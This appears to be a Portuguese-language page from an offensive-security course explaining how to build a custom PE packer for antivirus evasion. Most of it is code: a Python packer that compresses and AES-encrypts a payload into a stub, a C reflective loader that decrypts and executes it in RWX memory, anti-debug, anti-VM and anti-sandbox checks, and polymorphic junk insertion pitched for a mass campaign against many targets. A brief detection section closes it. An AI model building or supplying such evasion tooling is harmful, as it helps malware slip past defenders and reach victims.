---
layout: cyber
section: evasao
title: "Construindo um PE Packer"
---

# 16. Construindo um PE Packer

## Packer Custom vs UPX Assinado

Packers consagrados (UPX, ASPack, Themida) têm assinatura conhecida por AVs — entropia esperada, import table padrão, entry stub identificável. Packer custom evita essas assinaturas e adiciona camada de transform sobre o payload. O uso operacional cobre três frentes: reduzir hash signature surface (packed binary tem hash diferente do original), adicionar runtime decryption (encrypt at-rest, decrypt in-memory), e quebrar disassembly em IDA/Ghidra (lifted assembly só faz sentido após unpack).

---

## Pipeline de um Packer Custom

Packer = transform + wrapper. Pipeline:

```
[Original PE]
    │
    ▼
[Packer pipeline]
    ├─ Comprimir (LZMA, LZ4, zlib, ou skip)
    ├─ Encriptar (AES, RC4, XOR)
    └─ Embedar como blob em novo PE
    │
    ▼
[Packed PE]
    ├─ Stub PE (executável fino, ~10-20KB)
    │   ├─ DllMain/main = unpacker
    │   ├─ Decrypt blob in memory
    │   ├─ Reflective load PE blob
    │   └─ Jump para EntryPoint do original
    └─ .packed section = ciphertext do original PE
```

---

## Na Prática

### Componentes do packer

1. **Packer tool** (offline, Python/C): comprime + encripta PE e embebe em template stub.
2. **Stub loader** (C): decrypt + reflective load + jump.

### 1. Packer Tool (Python)

```python
import struct, zlib, os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

def pack(input_pe, stub_template, output):
    with open(input_pe, "rb") as f:
        pe_bytes = f.read()

    # Step 1: comprimir
    compressed = zlib.compress(pe_bytes, level=9)

    # Step 2: encriptar
    key = os.urandom(32)
    iv  = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    enc = cipher.encryptor()
    pad = (16 - len(compressed) % 16) % 16
    ct = enc.update(compressed + b"\x00" * pad) + enc.finalize()

    # Step 3: criar blob = [key][iv][original_size][compressed_size][ct]
    blob = key + iv
    blob += struct.pack("<II", len(pe_bytes), len(compressed))
    blob += ct

    # Step 4: append blob em section .packed do stub
    with open(stub_template, "rb") as f:
        stub = bytearray(f.read())

    # Localizar marker no stub (placeholder PACKED_BLOB_HERE)
    marker = b"\xDE\xAD\xBE\xEF" * 16  # 64-byte marker
    idx = stub.find(marker)
    if idx == -1: raise Exception("marker not found")

    # Substituir marker pelo blob
    stub[idx:idx + len(blob)] = blob

    with open(output, "wb") as f:
        f.write(stub)
```

### 2. Stub Loader (C)

```c
#include <windows.h>
#include <bcrypt.h>
#pragma comment(lib, "bcrypt")

// Blob embedded — marker placeholder substituído pelo packer
#pragma section(".packed", read, write)
__declspec(allocate(".packed"))
BYTE g_PackedBlob[1024 * 1024] = {
    0xDE, 0xAD, 0xBE, 0xEF, /* repetido */
    /* packer reescreve estes bytes */
};

BYTE* InflateZlib(BYTE* compressed, DWORD compSize, DWORD origSize) {
    // Implementação inline de inflate (ou linkar miniz/uzlib)
    BYTE* out = (BYTE*)VirtualAlloc(NULL, origSize, MEM_COMMIT, PAGE_READWRITE);
    // [...] zlib inflate
    return out;
}

LPVOID ReflectiveLoadPE(BYTE* pPeBytes, DWORD dwSize) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pPeBytes;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)(pPeBytes + pDos->e_lfanew);

    SIZE_T sImage = pNt->OptionalHeader.SizeOfImage;
    LPVOID pBase  = VirtualAlloc(NULL, sImage,
                                  MEM_COMMIT | MEM_RESERVE,
                                  PAGE_EXECUTE_READWRITE);

    // Copiar headers
    memcpy(pBase, pPeBytes, pNt->OptionalHeader.SizeOfHeaders);

    // Copiar sections
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    for (DWORD i = 0; i < pNt->FileHeader.NumberOfSections; i++, pSec++) {
        memcpy((BYTE*)pBase + pSec->VirtualAddress,
               pPeBytes + pSec->PointerToRawData,
               pSec->SizeOfRawData);
    }

    // Aplicar relocations (se base != PreferredBase)
    ULONG_PTR delta = (ULONG_PTR)pBase - pNt->OptionalHeader.ImageBase;
    if (delta) {
        // [...] walk IMAGE_DIRECTORY_ENTRY_BASERELOC + apply
    }

    // Resolver IAT
    // [...] walk IMAGE_DIRECTORY_ENTRY_IMPORT + LoadLibrary + GetProcAddress

    // Calcular entry point
    return (LPVOID)((BYTE*)pBase + pNt->OptionalHeader.AddressOfEntryPoint);
}

int main() {
    // Parse blob: key + iv + sizes + ct
    BYTE* key      = g_PackedBlob;
    BYTE* iv       = g_PackedBlob + 32;
    DWORD origSize = *(DWORD*)(g_PackedBlob + 48);
    DWORD compSize = *(DWORD*)(g_PackedBlob + 52);
    BYTE* ct       = g_PackedBlob + 56;

    DWORD ctSize = ((compSize + 15) / 16) * 16;

    // Step 1: AES decrypt
    BYTE* compressed = (BYTE*)VirtualAlloc(NULL, ctSize, MEM_COMMIT, PAGE_READWRITE);
    memcpy(compressed, ct, ctSize);

    BCRYPT_ALG_HANDLE hAlg;
    BCRYPT_KEY_HANDLE hKey;
    DWORD dwRes;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PBYTE)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, 32, 0);
    BCryptDecrypt(hKey, compressed, ctSize, NULL, iv, 16,
                  compressed, ctSize, &dwRes, 0);

    // Step 2: zlib inflate
    BYTE* pe = InflateZlib(compressed, compSize, origSize);

    // Step 3: reflective load + jump
    LPVOID pEntry = ReflectiveLoadPE(pe, origSize);
    ((void(*)())pEntry)();

    return 0;
}
```

---

## Anti-Analysis Layer (opcional)

Adicionar checks pré-unpack:

```c
// 1. Anti-debug
if (IsDebuggerPresent()) ExitProcess(0);

BOOL bRemoteDbg = FALSE;
CheckRemoteDebuggerPresent(GetCurrentProcess(), &bRemoteDbg);
if (bRemoteDbg) ExitProcess(0);

// 2. Anti-VM (CPUID hypervisor bit)
int cpuinfo[4];
__cpuid(cpuinfo, 1);
if (cpuinfo[2] & (1 << 31)) ExitProcess(0);  // hypervisor present

// 3. Anti-sandbox: tick count + sleep skew
ULONGLONG t1 = GetTickCount64();
Sleep(3000);
ULONGLONG t2 = GetTickCount64();
if (t2 - t1 < 2500) ExitProcess(0);  // sandbox acelera sleep

// Só então, decrypt + unpack
```

---

## Custom Section Names

Em vez de `.packed`, usar nomes que se misturam: `.rsrc`, `.text2`, `.idata2`. Reduz red flag de packed-binary identification por section name.

---

## Self-Modifying / Polymorphic Variants

Variante avançada: cada build gerado pelo packer tem:
- Layout aleatorizado das seções.
- Junk code inserido entre instruções.
- Chave AES + IV randoms.

Resultado: hash diferente a cada build, mesmo do mesmo payload. Útil para campanha mass com 1000 alvos = 1000 hashes únicos.

```python
# Junk insertion entre instruções no stub
junk = [
    b"\x90",                  # NOP
    b"\x50\x58",              # PUSH RAX / POP RAX
    b"\x48\x87\xC0",          # XCHG RAX, RAX
    b"\xEB\x00",              # JMP +0
]
```

---

## Detecção

- **Entropia anômala**: `.packed` section com entropia 7.8+ vs `.text` normal 5-6.
- **Pequeno binário com section grande**: stub ~20KB + .packed 500KB+ é suspeito.
- **Behavior**: process com `VirtualAlloc(RWX)` + escrita massiva + jump = unpack pattern.
- **Imports anêmicos**: stub só importa kernel32 + ntdll → suspeito.
  - Mitigação: importar APIs comuns mesmo sem usar.

## Tooling Real-World

- **Donut** (TheWover) — converts .NET/PE/DLL to position-independent shellcode (packer-like).
- **PEzor** (phra) — open-source PE packer.
- **Themida / VMProtect** — comercial, com virtualização de instruções.

## Trade-offs

**Pro**:
- Hash polymorphism (cada build diferente).
- Static analysis quebrada (precisa unpack para ler).
- Strings/IOCs hidden.

**Contra**:
- Stub é heuristic-suspect (RWX alloc + reflective load).
- Anti-analysis checks viraram red flags (debugger checks).
- Memory scan ainda detecta unpacked PE em runtime.

## Leitura Complementar

- Donut (TheWover) — https://github.com/TheWover/donut
- PEzor (phra)
- MITRE ATT&CK T1027.002 — Software Packing
